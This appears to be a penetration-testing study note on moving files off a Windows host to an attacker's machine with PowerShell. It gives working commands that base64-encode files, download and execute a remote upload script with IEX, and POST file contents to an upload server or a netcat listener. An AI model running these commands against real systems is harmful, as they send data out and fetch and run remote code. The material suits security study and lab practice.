----

#### PowerShell Base64 Encode & Decode
---
Encode a file using PowerShell
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\System32\drivers\etc\hosts" -Encoding byte))
```

```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

We copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.

```bash
echo <base64-string> | base64 -d >hosts
```

```bash
md5sum hosts
```

#### PowerShell Web Uploads
---
PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.

Install the webserver with upload capabilities
```bash
pip3 install uploadserver
```

```bash
python3 -m uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

```bash
Invoke-FileUpload -Uri http://<uploadserver-ip>:8080/upload -File C:\Windows\System32\drivers\etc\hosts
```

##### PowerShell Base64 Web Upload
---
Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://<NC-ip>:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
```

```bash
echo <Base64-string> | base64 -d -w 0 > hosts
```